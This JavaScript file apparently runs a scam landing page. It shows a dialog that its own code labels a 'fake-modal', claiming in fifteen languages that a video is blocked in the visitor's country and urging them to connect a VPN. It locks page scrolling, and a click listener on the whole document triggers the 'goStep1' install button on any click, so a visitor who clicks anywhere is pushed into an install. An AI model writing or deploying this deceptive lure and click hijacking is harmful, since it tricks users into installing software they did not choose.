document.body.style.overflow ="hidden";

(function () {
  const setViewportHeight = () => {
    const viewportHeight = window.visualViewport
      ? window.visualViewport.height
      : window.innerHeight;

    document.documentElement.style.setProperty(
      "--app-viewport-height",
      `${Math.round(viewportHeight)}px`
    );
  };

  setViewportHeight();
  window.addEventListener("resize", setViewportHeight);
  window.addEventListener("orientationchange", setViewportHeight);

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", setViewportHeight);
    window.visualViewport.addEventListener("scroll", setViewportHeight);
  }
})();

document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const modal = document.querySelector(".fake-modal");
  


    let totalSeconds = "60";
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

 const translations = {
  en: {
  modal_title_key: "This video may not be available in your country",
  modal_text_key: "Connect through a VPN to unblock websites and stream videos securely.",
  scan_now_option: "Click to connect VPN",
},

fr: {
  modal_title_key: "Cette vidéo peut ne pas être disponible dans votre pays",
  modal_text_key: "Connectez-vous via un VPN pour débloquer des sites web et regarder des vidéos en toute sécurité.",
  scan_now_option: "Cliquez pour connecter le VPN",
},

"pt-PT": {
  modal_title_key: "Este vídeo pode não estar disponível no seu país",
  modal_text_key: "Ligue-se através de uma VPN para desbloquear sites e ver vídeos em segurança.",
  scan_now_option: "Clique para ligar a VPN",
},

"pt-BR": {
  modal_title_key: "Este vídeo pode não estar disponível no seu país",
  modal_text_key: "Conecte-se por meio de uma VPN para desbloquear sites e assistir vídeos com segurança.",
  scan_now_option: "Clique para conectar a VPN",
},

es: {
  modal_title_key: "Es posible que este vídeo no esté disponible en su país",
  modal_text_key: "Conéctese mediante una VPN para desbloquear sitios web y ver vídeos de forma segura.",
  scan_now_option: "Haga clic para conectar la VPN",
},

"es-419": {
  modal_title_key: "Es posible que este video no esté disponible en tu país",
  modal_text_key: "Conéctate mediante una VPN para desbloquear sitios web y ver videos de forma segura.",
  scan_now_option: "Haz clic para conectar la VPN",
},

da: {
  modal_title_key: "Denne video er muligvis ikke tilgængelig i dit land",
  modal_text_key: "Opret forbindelse via en VPN for at få adgang til blokerede websites og streame videoer sikkert.",
  scan_now_option: "Klik for at oprette forbindelse til VPN",
},

ja: {
  modal_title_key: "この動画はお住まいの国では利用できない可能性があります",
  modal_text_key: "VPNに接続して、制限されたウェブサイトの閲覧や動画の安全な視聴を行ってください。",
  scan_now_option: "VPNに接続する",
},

fil: {
  modal_title_key: "Maaaring hindi available ang video na ito sa iyong bansa",
  modal_text_key: "Kumonekta gamit ang VPN upang ma-access ang mga website at manood ng mga video nang ligtas.",
  scan_now_option: "I-click upang kumonekta sa VPN",
},

de: {
  modal_title_key: "Dieses Video ist möglicherweise in Ihrem Land nicht verfügbar",
  modal_text_key: "Verbinden Sie sich über ein VPN, um Websites freizuschalten und Videos sicher zu streamen.",
  scan_now_option: "Klicken Sie, um das VPN zu verbinden",
},

nb: {
  modal_title_key: "Denne videoen er kanskje ikke tilgjengelig i ditt land",
  modal_text_key: "Koble til via en VPN for å få tilgang til nettsteder og strømme videoer sikkert.",
  scan_now_option: "Klikk for å koble til VPN",
},

sv: {
  modal_title_key: "Den här videon kanske inte är tillgänglig i ditt land",
  modal_text_key: "Anslut via en VPN för att få tillgång till webbplatser och streama videor säkert.",
  scan_now_option: "Klicka för att ansluta VPN",
},

it: {
  modal_title_key: "Questo video potrebbe non essere disponibile nel tuo Paese",
  modal_text_key: "Connettiti tramite una VPN per sbloccare siti web e guardare video in sicurezza.",
  scan_now_option: "Fai clic per connettere la VPN",
},

nl: {
  modal_title_key: "Deze video is mogelijk niet beschikbaar in uw land",
  modal_text_key: "Maak verbinding via een VPN om websites te deblokkeren en veilig video's te streamen.",
  scan_now_option: "Klik om VPN te verbinden",
},

ro: {
  modal_title_key: "Este posibil ca acest videoclip să nu fie disponibil în țara ta",
  modal_text_key: "Conectează-te printr-un VPN pentru a accesa site-uri web și pentru a viziona videoclipuri în siguranță.",
  scan_now_option: "Apasă pentru a conecta VPN-ul",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").textContent = t.modal_text_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;


document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    installBtn.click();
});




    if (bg) {
        requestAnimationFrame(() => {
            bg.classList.add("active");
        });
    }

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
